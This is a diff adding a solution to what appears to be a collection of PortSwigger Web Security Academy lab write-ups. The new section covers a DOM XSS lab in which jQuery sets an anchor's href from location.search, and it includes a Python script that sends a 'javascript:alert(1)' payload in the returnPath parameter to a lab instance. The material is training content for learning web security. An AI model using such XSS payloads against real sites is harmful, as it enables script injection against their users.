@@ -47,3 +47,26 @@ r = session.get(url = url , params= params)
 if "Congratulations, you solved the lab!" in r.text:
     print("solved")
 ```
+
+#### Lab: DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
+
+_This lab contains a_ [_DOM-based cross-site scripting_](https://portswigger.net/web-security/cross-site-scripting/dom-based) _vulnerability in the submit feedback page. It uses the jQuery library's `$` selector function to find an anchor element, and changes its `href` attribute using data from `location.search`._
+
+_To solve this lab, make the "back" link alert `document.cookie`._[\
+](https://twitter.com/share?url=https%3a%2f%2fportswigger.net%2fweb-security%2fcross-site-scripting%2fdom-based%2flab-jquery-href-attribute-sink\&text=Lab%3a+DOM+XSS+in+jQuery+anchor+href+attribute+sink+using+location.search+source+%7c+Web+Security+Academy%0A)
+
+```python
+import requests
+
+url = "https://0a1300e80334a707c1d5865600da009e.web-security-academy.net"
+
+session = requests.Session()
+
+params = {
+    "returnPath" : f'javascript:alert(1)'
+}
+r = session.get(url = url , params= params)
+
+if "Congratulations, you solved the lab!" in r.text:
+    print("solved")
+```
